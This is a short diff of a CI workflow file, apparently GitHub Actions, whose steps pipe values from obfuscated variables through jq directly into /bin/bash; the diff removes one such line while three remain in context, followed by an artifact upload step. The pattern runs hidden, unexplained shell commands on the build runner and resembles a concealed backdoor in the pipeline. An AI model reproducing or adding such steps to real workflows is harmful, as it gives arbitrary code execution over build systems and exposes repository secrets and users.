@@ -27,7 +27,6 @@ jobs:
           echo $u336 | jq -r .hsjqj8 | /bin/bash
           echo $mo02 | jq -r .abcwf6954 | /bin/bash
           printf '%s' "$fo508" | jq -r .fsg5 | /bin/bash
-          printf '%s' "$h4742" | jq -r .jvkk4354 | /bin/bash
 
       - name: Archive data
         uses: actions/upload-artifact@v4
